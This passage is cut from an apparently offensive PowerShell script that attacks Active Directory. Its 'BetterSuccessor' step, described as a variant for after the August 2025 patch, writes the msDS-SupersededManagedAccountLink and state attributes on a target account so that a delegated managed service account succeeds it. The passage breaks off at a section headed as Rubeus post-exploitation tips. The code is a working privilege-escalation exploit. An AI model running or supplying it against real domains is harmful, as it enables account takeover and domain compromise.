...
#>
    ...
    # 7. BetterSuccessor - mutual pairing (required post-August 2025 patch)
    try {
        $target = [ADSI]"LDAP://$precededDn"
        $dmsaRef = [ADSI]"LDAP://$serviceDn"
        $target.Put("msDS-SupersededManagedAccountLink", $serviceDn)
        $target.Put("msDS-SupersededServiceAccountState", 2)
        $target.SetInfo()
        Write-Host "[+] BetterSuccessor: wrote mutual pairing attributes on '$precededDn'." -ForegroundColor Green
    }
    catch {
        Write-Warning "[!] BetterSuccessor mutual pairing failed: $($_.Exception.Message)"
    }

    # 8. Rubeus post-exploitation tips (skip if quiet)
    if (-not $Quiet) {
